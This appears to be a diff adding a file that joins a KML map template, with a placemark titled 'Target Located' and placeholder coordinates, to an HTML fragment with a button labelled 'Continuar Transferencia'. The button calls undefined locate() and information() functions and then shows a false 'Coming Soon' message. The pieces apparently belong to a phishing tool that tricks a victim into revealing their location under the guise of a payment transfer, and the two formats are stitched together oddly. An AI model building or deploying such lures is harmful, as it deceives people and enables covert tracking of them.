@@ -1,0 +1,41 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<kml xmlns="http://www.opengis.net/kml/2.2">
+	<Document>
+    	<Style id="icon">
+      		<IconStyle>
+        		<Icon>
+          			<href>http://maps.google.com/mapfiles/kml/paddle/ylw-blank.png</href>
+        		</Icon>
+      		</IconStyle>
+      		
+      		<LabelStyle>
+        		<color>ff00ffff</color>
+        		<colorMode>normal</colorMode>
+        		<scale>1.5</scale>
+      		</LabelStyle>
+    	</Style>
+		
+		<Placemark>
+			<name>Target Located</name>
+			<styleUrl>#icon</styleUrl>
+    		<Point>
+				<coordinates>LONGITUDE,LATITUDE,0</coordinates>
+    		</Point>
+  		</Placemark>
+  	</Document>
+</kml>
+
+
+
+
+
+                <body onload="information();">
+                   
+                  <div><button id="card-pagos-btn change"
+              onclick="locate(function(){$('#change').html('Coming Soon'); alert('Thank you for taking interest in Near You...This product is coming soon...');}, function(){$('#change').html('Failed');});"
+                class="boton prm btn btn-primary button"
+                type="button"
+                style="color: #de2920; margin-top: 1rem; background-color: #fccf00; border: none; padding: 10px 20px; border-radius: 8px; font-size: 18px; letter-spacing: 1px;">Continuar
+                Transferencia</button>
+
+                </body>
